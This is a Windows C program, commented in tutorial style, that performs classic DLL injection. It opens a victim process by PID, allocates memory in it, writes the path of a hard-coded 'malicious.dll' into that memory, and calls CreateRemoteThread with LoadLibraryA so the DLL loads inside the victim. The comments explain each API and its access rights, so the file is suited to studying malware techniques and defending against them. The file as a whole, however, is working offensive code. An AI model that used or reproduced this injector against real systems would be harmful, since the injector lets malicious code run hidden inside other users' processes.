#include <Windows.h>
#include <stdio.h>
#include <TlHelp32.h>

int main(int argc, char* argv[])
{
	unsigned int victimProcessId;

	if (argc > 1)
	{
		/*
		The function atoi() isn't the best solution for converting a char pointer to integer,
		as it will convert any invalid number to 0.
		A better solution is described here: https://stackoverflow.com/questions/2797813/how-to-convert-a-command-line-argument-to-int
		*/
		victimProcessId = atoi(argv[1]);
		printf("[+] Performing Classic DLL Injection inside the victim process identified by the PID: %d\n", victimProcessId);
	}
	else
	{
		printf("[+] Usage:\n\tprogram.exe PID\n");
		return 1;
	}

	/*
	Use OpenProcess to get a handle to the victim process.
	*/
	DWORD desiredAccess = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ;
	HANDLE victimProcessHandle = OpenProcess(
		desiredAccess,								// PROCESS_VM_OPERATION is enough for a successful call to VirtualAllocEx
													// however WriteProcessMemory also requires PROCESS_VM_WRITE according to the docs
													// CreateRemoteThread also requires PROCESS_VM_READ, PROCESS_CREATE_THREAD, 
													// and PROCESS_QUERY_INFORMATION
		NULL,										// whether the processes created by this process can inherit this handle
													// in this case it's NULL, so no inheritance
		victimProcessId);							// open this specific process

	/*
	According to the official documentation, OpenProcess returns NULL if it fails to get a handle
	Ref: https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
	*/
	if (victimProcessHandle == NULL)
	{
		printf("[!] Call to OpenProcess failed\n");

		/*
		According to the official documentation, you can use the function GetLastError() to get
		extended error information
		Ref: https://docs.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-getlasterror
		*/
		printf("[!] Specific Win32 error: %d\n", GetLastError());

		return 1;
	}
	else
	{
		printf("[+] Successfully created a handle for the victim process\n");
	}

	/*
	Allocate some space inside the memory of the victim process.
	Later, it will store the absolute path of the malicious DLL library.
	For more information regarding the arguments of VirtualAllocEx:
	https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
	*/
	LPVOID allocatedMemory = VirtualAllocEx(
		victimProcessHandle,					// reserve a new memory page inside the victim process
		NULL,									// we don't care where to allocate the memory
		4096,									// allocate 4096 bytes
		MEM_COMMIT | MEM_RESERVE,				// commit and reserve memory in one step
		PAGE_READWRITE);						// set the memory page as readable/writable

	if (allocatedMemory == NULL)
	{
		printf("[!] Call to VirtualAllocEx failed\n");
		printf("[!] Specific Win32 error: %d\n", GetLastError());

		return 1;
	}
	else
	{
		printf("[+] Successfully allocated some memory in the victim process\n");
		printf("[+] Starting address: %p\n", allocatedMemory);
	}

	/*
	Path to the malicious DLL library to inject in the victim process.
	An alternative is to use a command-line argument (argv[1]).
	*/
	char maliciousLibrary[] = "C:\\Users\\rbct\\Desktop\\malicious.dll";

	/*
	Now that we have defined the path of the malicious DLL, we have to
	copy it into the memory of the victim process.
	We can use the space allocated by VirtualAllocEx.
	*/
	BOOL retVal = WriteProcessMemory(
		victimProcessHandle,			// handle to the process in which to the write the bytes
		allocatedMemory,				// starting address where to write the bytes
		maliciousLibrary,				// buffer containing the bytes to write
		strlen(maliciousLibrary),		// number of bytes to write, in this case: the size of the path
		NULL);							// pointer to variable which will contain the number of bytes written
										// in this case, we don't really need it

	if (retVal == 0)
	{
		printf("[!] Call to WriteProcessMemory failed\n");
		printf("[!] Specific Win32 error: %d\n", GetLastError());

		return 1;
	}
	else
	{
		printf("[+] Successfully wrote the path of the DLL inside the allocated memory space\n");
	}

	/*
	Process of the same bitness (32-bit or 64-bit) should have the same absolute address
	for the functions of kernel32.dll, as it's loaded at the very beginning of the process
	execution.
	To get the address of LoadLibraryA:
	1. get a handle to the module kernel32.dll using GetModuleHandle
	2. get the absolute address of the function using GetProcAddress
	*/
	HMODULE handleTargetModule = GetModuleHandleA("kernel32.dll");
	PVOID loadLibraryLocalAddress = GetProcAddress(handleTargetModule, "LoadLibraryA");

	/*
	Now that we have the absolute address of the target function (LoadLibraryA)
	we're ready to create a new thread in the victim process, in order to load
	malicious DLL (path copied with WriteProcessMemory).
	*/
	HANDLE remoteThread = CreateRemoteThread(
		victimProcessHandle,								// handle to the victim process
		NULL,												// pointer to SECURITY_ATTRIBUTES struct
															// can be null if we want default security attributes
		0,													// size of the stack, 0 for default
		(LPTHREAD_START_ROUTINE)loadLibraryLocalAddress,	// starting address of the thread
															// in this case, the address of LoadLibraryA
		allocatedMemory,									// pointer to a variable to be passed to the thread function
															// in this case, the address of the path of the malicious DLL
		0,													// flags to manipulate the creation of the thread
															// (e.g. start suspended)
															// in this case, 0 -> start thread immediately
		NULL);												// pointer to a variable that receives the thread identifier
															// we don't need it, so it's set to NULL

	if (remoteThread == NULL)
	{
		printf("[!] Couldn't create the remote thread. Error: %d\n", GetLastError());
		return 1;
	}
	else
	{
		printf("[+] Remote thread create. The DLL should be loaded right now...");
	}

	/*
	You can use WaitForSingleObject in order to wait for the remote thread to finish,
	before terminating the current program.
	*/
	WaitForSingleObject(remoteThread, INFINITE);

	return 0;
}
